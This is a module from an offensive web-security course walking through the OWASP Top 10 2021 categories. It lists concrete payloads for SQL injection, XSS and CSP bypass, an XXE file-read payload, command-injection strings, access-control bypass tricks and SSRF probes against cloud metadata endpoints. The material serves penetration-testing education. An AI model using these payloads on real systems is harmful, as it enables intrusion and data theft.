# Module 14 · OWASP Top 10 Deep Dives

OWASP's Top 10 is the de-facto industry checklist for web vulnerability classes. The 2021 list is current as of this writing; the 2025 list is in draft. This module walks through every category with attacker-first methodology, real CVE pegs, and tooling.

We'll cover them in **attacker priority order** rather than OWASP's order — i.e., what to look for first when you sit down with a fresh target.

## A03:2021 — Injection (SQL, NoSQL, OS, LDAP, expression languages)

Despite 25 years of warnings, injection still tops every bug bounty leaderboard. Here's why: the attack surface keeps expanding. SQL is just the start.

### SQL Injection (SQLi)

Three flavors:

1. **In-band (error-based / UNION-based)** — server returns the data in the response. Easy when the developer turned on debug error messages or used `mysql_error()` directly.
2. **Inferential (blind boolean / time-based)** — server's response differs based on a true/false condition. We extract data one bit at a time.
3. **Out-of-band** — server makes a DNS or HTTP callback to attacker-controlled infrastructure (Burp Collaborator pattern). Useful when in-band and blind both fail.

**The canonical detection sequence:**

```python
# Test 1: A single quote breaks the query?
GET /search?q=foo'           → 500 error or behavioral change
GET /search?q=foo''          → back to normal (escaped quote)
                             → confirms parameter is interpolated

# Test 2: Boolean blind
GET /search?q=foo' OR '1'='1   → returns all rows (or different page)
GET /search?q=foo' OR '1'='2   → returns nothing
                                → confirms boolean control over query

# Test 3: Time-based blind (when boolean is invisible)
GET /search?q=foo' AND SLEEP(5)--    → response delayed 5s
GET /search?q=foo' AND SLEEP(0)--    → response normal

# Test 4: Stack the query (RCE in some configs)
GET /search?q=foo'; SELECT pg_sleep(5)--
```

Our **`sqli_oracle.py`** automates this exact sequence with database-fingerprinting (Postgres uses `pg_sleep`, MSSQL uses `WAITFOR DELAY`, Oracle uses `DBMS_PIPE.RECEIVE_MESSAGE`, MySQL/MariaDB use `SLEEP`/`BENCHMARK`), then extracts data with binary search if blind.

**Where to find SQLi in 2026 production code:**

| Surface | Example |
|---|---|
| Search forms | `WHERE name LIKE '%${q}%'` — classic |
| Sort/order parameters | `ORDER BY ${col}` — can't parameterize column name |
| Custom report builders | Direct SQL in a UI |
| GraphQL filters with raw fragments | `where: { _raw: "id = ${input}" }` |
| Reporting/BI tools (PowerBI, Tableau public APIs) | Query interpolation in URL parameters |
| Legacy SOAP endpoints | XML-encoded SQL in elements |
| MongoDB / NoSQL aggregation pipelines | `$where: "this.user == '${input}'"` |

**Defense (so you can write convincing reports):** parameterized queries, prepared statements, ORM with explicit binding, allow-listed identifiers for column/table names that can't be parameterized.

### Cross-Site Scripting (XSS)

Three flavors:

1. **Reflected** — input from URL/POST is reflected directly into the response. Single victim per click.
2. **Stored / Persistent** — input persists server-side and is rendered to other users. Highest impact.
3. **DOM-based** — JS reads attacker-controlled input (URL hash, postMessage) and writes it to the DOM unsafely. Often invisible to server-side scanners.

**Reflected XSS detection algorithm:**

```python
1. Pick a random alphanumeric canary, e.g. "rsxss19237"
2. Send each parameter with the canary appended:
   GET /search?q=foo+rsxss19237
3. Search the response body for "rsxss19237"
4. If present, determine the HTML/JS context:
   - <p>...rsxss19237...</p>     → HTML body
   - <input value="rsxss19237">  → attribute
   - <script>var x = "rsxss19237";</script>  → JS string
   - <a href="rsxss19237">       → URL context
5. For each context, send the matching breakout payload:
   - HTML body:    <svg onload=alert(1)>
   - Attribute:    "><svg onload=alert(1)>
   - JS string:    ";alert(1);//
   - URL:          javascript:alert(1)
6. Confirm the payload is reflected un-encoded
```

Our **`xss_scanner.py`** runs this loop with a curated payload library, including **CSP-aware** payloads that work even with strict policies (JSONP-bridge, AngularJS sandbox escapes for legacy apps, framework-specific gadgets).

**The CSP-bypass landscape:**

| CSP type | Bypass |
|---|---|
| `script-src 'self'` | JSONP endpoints on the same origin (often `/api/jsonp`); user-uploaded files served from same origin |
| `script-src 'unsafe-inline'` | Trivially exploitable XSS |
| `script-src 'nonce-XXX'` | Reuse the nonce from a same-page script tag if the page allows comment injection |
| `script-src 'strict-dynamic'` | Inject via existing trusted scripts loading attacker-controlled URLs |
| `script-src https://cdn.example.com` | Find any JSONP/library on `cdn.example.com` (Angular templates, AMD module loaders, etc.) |

### XML External Entity (XXE)

Reachable in:
- SOAP services
- File-upload endpoints accepting `.docx`, `.svg`, `.xlsx` (these are ZIPs of XML)
- SAML response handlers
- Any custom XML parser

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Common variations:
- File read: `file:///etc/passwd`, `file:///c:/windows/win.ini`
- SSRF via XXE: `http://internal-server/`
- Out-of-band exfil via DTD: load attacker-controlled DTD that defines the data extraction
- Billion-laughs DoS

Our **`xxe_oracle.py`** auto-detects parser type, supports OOB exfil via DNS/HTTP, and runs the file-read + SSRF-via-XXE matrix.

### Command Injection

Tests:
```bash
GET /ping?host=8.8.8.8;id          # naive concatenation
GET /ping?host=8.8.8.8`id`         # backtick
GET /ping?host=8.8.8.8|id          # pipe
GET /ping?host=8.8.8.8&&id         # AND
GET /ping?host=$(id)               # subshell
GET /ping?host=8.8.8.8%0Aid        # newline injection
```

Time-based blind detection:
```
GET /ping?host=8.8.8.8;sleep%205    → 5 second delay
```

Our **`cmd_injection.py`** runs all variants with a per-OS payload set (Linux/Windows/PowerShell).

## A01:2021 — Broken Access Control

Now the most common category in OWASP's 2021 ranking. Two main forms.

### IDOR / BOLA

The classic "I can access /api/user/$other_id":

```
GET /api/orders/12345  → my order
GET /api/orders/12346  → someone else's order ✗
```

**Detection methodology:**

1. Authenticate as user A. Note all object IDs in URLs and JSON responses.
2. Authenticate as user B (separate account). Same.
3. From user A's session, attempt to access user B's IDs.
4. Categorize per endpoint:
   - 200 with their data: confirmed IDOR
   - 403 with "not your resource": correct
   - 200 with empty data: misleading; check the response carefully
   - 404: hides existence (better, not perfect)

Subtle variations:
- **UUID-based IDs** are *not* sufficient defense. They're harder to guess but sometimes leak in earlier endpoints.
- **Hash-based IDs** can sometimes be brute-forced if the hash is short or unsalted.
- **Sequential IDs in JSON arrays** — the API returns `[{id: 100}, {id: 101}]` — those are next-target candidates.
- **Numeric IDs in mobile API tokens** — JWT subjects, API keys with embedded user IDs.

Our **`api_idor_fuzzer.py`** takes two sessions, walks the endpoint map, and reports access-control violations.

### Vertical privilege escalation

User with role A can access endpoints intended for role B:

```
# As regular user:
GET /api/admin/users          → 403
GET /api/admin/users/         → 200 ✗ (trailing slash!)
GET /api/admin/users.json     → 200 ✗ (extension trick)
GET /api/admin/users#         → 200 ✗ (fragment ignored by router)
GET /api/admin/users%20       → 200 ✗ (trailing space)
GET /api/Admin/users          → 200 ✗ (case sensitivity)

# Header tricks:
GET /api/admin/users
X-Original-URL: /api/admin/users
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

Our **`auth_bypass_probe.py`** runs all of these.

### Mass Assignment / Parameter Pollution

```python
# Update profile endpoint accepts:
PATCH /api/users/me
{ "displayName": "Alice" }

# But the model accepts more fields:
PATCH /api/users/me
{ "displayName": "Alice", "isAdmin": true, "balance": 1000000 }
```

Frameworks like Rails and Django historically had this risk by default; modern versions ship with allow-lists, but third-party code rarely uses them. Our IDOR fuzzer also tests for mass assignment.

## A02:2021 — Cryptographic Failures

Most are foundation-level (Module 07): weak ciphers, missing HSTS, predictable tokens, hardcoded secrets, etc. Web-specific ones:

- **Weak password hashes** in dump (MD5, unsalted SHA-1, fast-hash)
- **JWT** with weak secret or `alg=none` (Module 07's `jwt_tool.py`)
- **Predictable session IDs** — measure entropy
- **Tokens in URL** (Bearer in query string, OAuth code in `Referer`)
- **Sensitive data in localStorage** (XSS = full theft, no HttpOnly protection)

Our **`cookie_analyzer.py`** flags missing security flags; the existing `jwt_tool.py` (Module 07) handles JWT issues.

## A05:2021 — Security Misconfiguration

The grab-bag category. Concrete items:

| Misconfiguration | Detection |
|---|---|
| Default credentials | Try `admin/admin`, `admin/password`, vendor defaults |
| Sample/test pages exposed | `/test.php`, `/info.php`, `/phpinfo.php`, `/.git/`, `/server-status` |
| Directory listing enabled | Walk paths; look for raw `Index of /` responses |
| Verbose errors in production | Trigger 500s; read stack traces |
| Default WordPress/Drupal/Joomla content | `/wp-admin/install.php`, `/CHANGELOG.txt`, etc. |
| Outdated software with known CVEs | `Server:` header version + `vuln_correlator.py` (Module 10) |
| Cloud metadata endpoints exposed | SSRF to `169.254.169.254` (Module 14 SSRF section) |
| `.git/HEAD` exposed | Source code disclosure |
| `.DS_Store` exposed | Directory contents disclosure |
| Backup files | `app.zip`, `config.bak`, `wp-config.php~`, `web.config.bak` |
| Excessive CORS | `cors_probe.py` |

Our **`web_recon_runner.py`** orchestrates these checks.

## A06:2021 — Vulnerable and Outdated Components

Concrete attacker workflow:
1. Identify all libraries/frameworks (banner, comments in source, JS bundle filenames, X-Powered-By).
2. Look up CVEs against versions.
3. Cross-reference against the asset graph from Part 3.

Tools you already have:
- `vuln_correlator.py` (Part 3 Module 10) for service-level CVE matching
- `cert_harvester.py` (Part 3) for finding all subdomains where the same vulnerable software lives

**Specific 2025-2026 prevalent components to know:**
- Log4j (CVE-2021-44228) — still in long-tail Java apps
- Spring Cloud Function (CVE-2022-22963) and Spring4Shell (CVE-2022-22965)
- ProxyShell / ProxyNotShell (Microsoft Exchange)
- MOVEit Transfer (CVE-2023-34362) — Cl0p ransomware vector
- Citrix ADC NetScaler (CVE-2023-3519) — heavily exploited
- Confluence (CVE-2023-22515)
- Ivanti Connect Secure (CVE-2024-21887)

## A10:2021 — Server-Side Request Forgery (SSRF)

Single most-paid bug class on bug bounty programs. Why: it bridges from web tier to internal network.

**Detection sequence:**

```python
# 1. Find a parameter that fetches a URL
POST /api/import { "url": "https://example.com/feed.xml" }

# 2. Try internal addresses
POST /api/import { "url": "http://127.0.0.1/" }
POST /api/import { "url": "http://localhost:8080/" }
POST /api/import { "url": "http://127.0.0.1:6379/" }     # Redis
POST /api/import { "url": "http://127.0.0.1:9200/" }     # Elasticsearch
POST /api/import { "url": "http://127.0.0.1:9090/" }     # Prometheus

# 3. Try cloud metadata
POST /api/import { "url": "http://169.254.169.254/latest/meta-data/" }
                                                          # AWS IMDSv1
POST /api/import { "url": "http://metadata.google.internal/" }
                                                          # GCP
POST /api/import { "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01" }
                                                          # Azure (header required)

# 4. Filter bypasses
POST /api/import { "url": "http://[::]:80/" }            # IPv6 loopback
POST /api/import { "url": "http://0.0.0.0/" }
POST /api/import { "url": "http://127.1/" }              # short notation
POST /api/import { "url": "http://127.000.000.001/" }    # padded notation
POST /api/import { "url": "http://0x7f000001/" }         # hex
POST /api/import { "url": "http://2130706433/" }         # decimal
POST /api/import { "url": "http://example.com@127.0.0.1/" }  # userinfo

# 5. DNS rebinding (when filter resolves first then connects)
- Set up rebind.your.domain → returns 1.2.3.4 first, then 127.0.0.1
- App resolves 1.2.3.4, validates it as external, then connects, gets 127.0.0.1
```

**Cloud metadata gotchas:**
- AWS IMDSv2 requires a `X-aws-ec2-metadata-token` header — IMDSv1 doesn't. Lots of orgs are still on v1.
- Azure requires `Metadata: true` header to access metadata.
- GCP requires `Metadata-Flavor: Google` header.

Our **`ssrf_prober.py`** runs the full sequence including cloud-specific endpoints and notation tricks. **`web/path_traversal.py`** handles the file:// flavor of SSRF.

## A04:2021 — Insecure Design

Less a vulnerability class, more a methodology gap. Includes:

- Lack of rate limiting on auth endpoints
- No account lockout (or trivially bypassable lockout)
- Predictable password reset tokens
- Race conditions in financial flows
- Logic flaws in coupon/discount/refund flows

Race conditions specifically deserve mention. The classic case:

```
User has $10 in their account.
User submits 5 simultaneous "transfer $10" requests.
If the deduction is non-atomic, all 5 succeed.
```

Tooling: send requests in burst with HTTP/2 single-packet attack (Module 16 covers this).

## A07:2021 — Identification & Authentication Failures

Module 17 covers this exhaustively. Highlights:

- Brute-force-able login (no rate limit, no captcha)
- Credential stuffing protection absent
- Password reset using only email-based tokens (no out-of-band confirmation)
- Session timeout never reached
- Multi-factor bypass via SMS interception or backup codes

## A08:2021 — Software and Data Integrity Failures

- Unsigned updates / packages
- Untrusted CI/CD pipelines (supply chain)
- Insecure deserialization (Java, .NET, Python pickle, PHP unserialize, Ruby Marshal)

Insecure deserialization tooling is a deep rabbit hole — `ysoserial` for Java, `marshalsec`, `phpgg`. Our toolkit doesn't reproduce these (they're language-specific gadget chains better used as-is); we add detection in `web/auth_bypass_probe.py` for cookie/token deserialization markers.

## A09:2021 — Security Logging & Monitoring Failures

This is fundamentally a defender concern. As an attacker, you exploit the absence: lack of detection means you can scan more aggressively, brute-force more loudly, and rotate IPs less frequently. The corollary on the report-writing side: always recommend WAF, SIEM correlation, and alerting on auth failure patterns.

## Practical workflow — the 1-hour first pass

When you're handed a new web target:

```
T+0:    fingerprint headers, save to /tmp/headers.txt
        → http_client.py --fingerprint
T+5:    cookie audit, CORS audit, TLS audit
        → web_recon_runner.py
T+15:   crawl JS bundles for endpoint discovery
        → manual + grep for /api/, /v1/, /v2/
T+25:   test top-3 user-input endpoints for SQLi/XSS
        → sqli_oracle.py + xss_scanner.py
T+40:   test any URL-fetching parameter for SSRF
        → ssrf_prober.py
T+50:   scan for IDOR with two test accounts
        → api_idor_fuzzer.py
T+60:   first pass complete; have a triage list
```

The remaining 39 hours of a typical 40-hour engagement go into chasing the most promising findings to full exploit, plus exploring niche endpoints, plus writing up.

## Industry-specific framings

### Financial services

The single most-impactful bug class in retail banking: **race conditions on transfer endpoints**. A second close: **IDOR on statement/PDF download**. SQLi on auth-required surfaces is rarer but devastating when found.

### Healthcare

PHI lives behind the patient-portal API. **IDOR on appointment/lab-result/prescription endpoints** is the #1 finding in HHS HIPAA breach reports. **Mass assignment** on patient profile updates is #2.

### Government

**Authentication bypass** — particularly via SAML signature wrapping (Module 17) — is the highest-paid category on Hack the Pentagon and similar VDPs. **SSRF to internal classified-adjacent infrastructure** is heavily rewarded.

### ICS / Critical Infrastructure

The web tier on industrial systems is often a **historian / HMI portal**. XSS there can pivot to operator workstations; SSRF can reach OT-network jump boxes. Caution: scanning ICS web tiers can crash them, with safety implications. Special engagement rules apply.

## Recap

You should now be able to:

- Execute the canonical detection sequence for SQLi, XSS, XXE, SSRF, command injection, IDOR
- Map any of the OWASP 2021 categories to specific tools you can run
- Conduct a 1-hour first-pass on a fresh target
- Frame findings in terms relevant to financial/healthcare/government clients

Tools shipped with this module:

| Script | Purpose |
|---|---|
| `redshift_toolkit.web.sqli_oracle` | Boolean / time-based blind SQLi tester with DBMS fingerprint |
| `redshift_toolkit.web.xss_scanner` | Reflected XSS probe with context-aware payload library |
| `redshift_toolkit.web.xxe_oracle` | XXE detection (file read, SSRF, OOB exfil) |
| `redshift_toolkit.web.ssrf_prober` | SSRF + cloud metadata + notation tricks |
| `redshift_toolkit.web.path_traversal` | LFI/RFI scanner |
| `redshift_toolkit.web.cmd_injection` | OS command injection oracle |
| `scripts/part-04/14-owasp-deep-dives/owasp_runner.py` | Module 14 orchestrator |

→ Next: [Module 15 · Modern API Attacks](15-api-attacks.md).
